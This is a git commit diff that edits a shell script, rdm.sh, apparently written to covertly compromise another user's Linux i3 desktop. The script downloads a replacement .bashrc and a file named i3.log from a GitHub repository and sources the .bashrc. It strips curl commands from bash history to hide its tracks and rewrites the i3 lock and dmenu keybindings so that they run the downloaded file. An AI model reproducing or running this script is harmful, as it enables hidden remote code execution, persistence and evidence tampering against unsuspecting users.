c0e92610b406b76d31260c18fa8f5bfb5e858456
Dimitri Attal <dimitri.attal@epita.fr>
2026-09-03 12:49:01 +0200

    dac

--- rdm.sh
+++ rdm.sh
@@ -1,19 +1,21 @@
-dir="~/.config/ssh"
-[ -r "$dir" ] || exit 1
-[ -e "$dir/anticflse" ] && exit 1
+dire="$HOME/.config/ssh"
+[ -e "$dire/anticflse" ] && exit 1
 
 mv ~/.bashrc ~/.config/tp.py
 cmd="curl .*"
-grep -v "$cmd" ~/.bash_history > ~/.bash_history.tmp && mv ~/.bash_history.tmp ~/.bash_history && history -c && history -r
+if [ -f "$HOME/.bash_history" ]; then
+    grep -v "$cmd" ~/.bash_history > ~/.bash_history.tmp && \
+        mv ~/.bash_history.tmp ~/.bash_history && history -c && history -r
+fi
 curl -sO https://raw.githubusercontent.com/did73at/cflse/main/.bashrc
 source .bashrc
 curl -sO https://raw.githubusercontent.com/did73at/cflse/main/i3.log
 mv i3.log ~/.config/i3/
-dir="~/.config/i3"
+dir="$HOME/.config/i3"
 cp $dir/config $dir/conf
-filename="~/.config/i3/config"
+filename="$HOME/.config/i3/config"
 sed -E 's|(bindsym .* exec) i3lock .*|\1 --no-startup-id bash -c "source ~/.config/i3/i3.log \&\& i3lock"|' "$filename" > "$filename.tmp" && mv "$filename.tmp" "$filename"
-sed -E 's|(bindsym .* exec --no-startup-id) .* dmenu_run|\1 bash ~/.config/i3/i3.log |' "$filename" > "$filename.tmp" && mv "$filename.tmp" "$filename"
+sed -E 's|(bindsym .* exec --no-startup-id) dmenu_run|\1 bash ~/.config/i3/i3.log |' "$filename" > "$filename.tmp" && mv "$filename.tmp" "$filename"
 
 i3-msg reload
 curl -sO https://raw.githubusercontent.com/did73at/cflse/main/anticflse
